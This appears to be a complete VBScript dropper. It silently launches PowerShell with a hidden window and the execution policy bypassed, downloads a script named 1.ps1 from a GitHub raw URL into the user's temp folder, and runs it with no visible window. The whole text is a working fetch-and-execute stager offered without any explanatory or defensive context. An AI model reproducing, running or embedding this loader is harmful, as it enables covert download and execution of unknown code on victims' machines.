command = "powershell -NoP -NonI -W h -Exec Bypass md ""$env:USERPROFILE\temp""; iwr ""https://raw.githubusercontent.com/Noshbit/Pierogi/main/1.ps1""  -outfile ""$env:USERPROFILE\temp\1.ps1""; cd ""$env:userprofile\temp""; sleep 5; & .\1.ps1"
 
set shell = CreateObject("WScript.Shell")
 
shell.Run command,0
